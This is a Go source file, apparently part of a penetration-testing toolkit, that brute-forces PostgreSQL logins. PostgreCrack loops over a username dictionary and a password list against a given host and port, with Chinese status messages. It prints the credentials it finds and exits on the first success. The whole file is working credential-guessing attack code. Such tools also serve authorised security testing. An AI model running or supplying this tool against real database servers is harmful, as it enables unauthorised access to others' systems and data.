package pac

import (
	"database/sql"
	"fmt"
	"os"
	"strings"

	_ "github.com/lib/pq"
)

const (
	dbname = "postgres"
)

func postgre_connect(Rhost string, Rport string, Ruser string, PWD string) (conn *sql.DB, sign bool) {
	psqlInfo := fmt.Sprintf("host=%s port=%s user=%s "+"password=%s dbname=%s sslmode=disable", Rhost, Rport, Ruser, PWD, dbname)

	conn, err := sql.Open("postgres", psqlInfo)
	if err != nil {
		Err(err)
		return nil, false
	}

	err = conn.Ping()
	if err != nil {
		Err(err)
		return nil, false
	}
	sign = true
	Success("连接成功")
	return conn, sign
}

func PostgreCrack(Rhost string, Rport string) {
	Info("开始爆破,请稍等.....")
	sign = false
	for _, user := range Userdict["postgresql"] {
		for _, pass := range Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			_, sign := postgre_connect(Rhost, Rport, user, pass)
			if sign == true {
				Success(fmt.Sprintf("账号密码为：%s:%s", user, pass))
				os.Exit(0)
			} else {
				fmt.Println(fmt.Sprintf("%s:%s 未成功爆破出账号密码", user, pass))
			}
		}
	}
}
